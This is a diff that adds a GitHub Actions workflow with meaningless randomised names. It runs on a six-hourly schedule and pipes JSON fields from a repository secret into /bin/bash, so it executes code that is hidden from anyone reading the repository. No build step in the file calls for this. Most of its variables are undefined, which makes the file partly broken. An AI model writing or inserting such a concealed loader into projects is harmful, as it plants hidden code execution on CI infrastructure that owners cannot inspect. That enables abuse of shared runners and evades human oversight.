@@ -1,0 +1,21 @@
+name: znckaoi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: znckaoi
+        env:
+          whch2582: ${{ secrets.whch2582 }}
+        run: |
+          echo $whch2582 | jq -r .r935 | /bin/bash
+          echo $pz9 | jq -r .meipw60605 | /bin/bash
+          echo $gijb38162 | jq -r .j488 | /bin/bash
+          echo $h1 | jq -r .jmc1120 | /bin/bash
+          echo $xloei91958 | jq -r .ri017 | /bin/bash
+          echo $xcrg3 | jq -r .b36038 | /bin/bash
+
